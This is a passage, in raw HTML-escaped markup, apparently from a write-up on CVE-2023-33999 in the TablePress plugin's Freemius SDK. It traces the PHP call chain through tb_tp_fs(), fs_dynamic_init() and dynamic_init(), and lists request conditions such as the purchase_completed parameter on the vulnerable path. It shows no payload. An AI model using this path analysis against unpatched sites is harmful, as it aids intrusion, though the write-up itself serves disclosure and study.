class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_anonymous&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After successfully setting up the plugin, the system sends a confirmation email to complete this connection (opt-in) process.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/opt_in.png&#34; title=&#34;Connect to Freemius&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/opt_in.png&#34; data-sub-html=&#34;&lt;h2&gt;Opt In&lt;/h2&gt;&lt;p&gt;Connect to Freemius&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/opt_in.png&#39; alt=&#34;Opt In&#34; height=&#34;238&#34; width=&#34;1380&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Connect to Freemius&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;The request must contain the &lt;code&gt;purchase_completed&lt;/code&gt; parameter&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;fs_request_has&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;purchase_completed&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;fs_request_has&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;dynamic_init()&lt;/code&gt; is called inside the &lt;code&gt;fs_dynamic_init()&lt;/code&gt; function&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;fs_dynamic_init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$module&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$fs&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Freemius&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;instance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;slug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$fs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;dynamic_init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$module&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$fs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function creates an instance of &lt;code&gt;Freemius&lt;/code&gt; and calls &lt;code&gt;dynamic_init()&lt;/code&gt; to initialize the SDK with the configuration from &lt;code&gt;$module&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;fs_dynamic_init()&lt;/code&gt; is called in the file &lt;code&gt;tablepress/tablepress.php&lt;/code&gt; (the &lt;code&gt;tb_tp_fs()&lt;/code&gt; function)&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;tb_tp_fs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;global&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tb_tp_fs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tb_tp_fs&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Include&amp;ensp;Freemius&amp;ensp;SDK.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;require_once&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;__DIR__&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/libraries/freemius/start.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tb_tp_fs&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;fs_dynamic_init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;10340&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;slug&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tablepress&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;plugin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;public_key&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pk_b215ca1bb4041cf43ed137ae7665b&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_premium&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;has_addons&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;has_paid_plans&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;menu&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;slug&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tablepress&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;contact&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;support&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;account&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pricing&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;opt_in_moderation&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;new&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;updates&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_live&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tb_tp_fs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Loads the Freemius SDK&lt;/li&gt;&#xA;&lt;li&gt;Calls &lt;code&gt;fs_dynamic_init()&lt;/code&gt; with the configuration for TablePress&lt;/li&gt;&#xA;&lt;li&gt;Stores the instance in the global variable &lt;code&gt;$tb_tp_fs&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;tb_tp_fs()&lt;/code&gt; is called directly in &lt;code&gt;tablepress/tablepress.php&lt;/code&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; 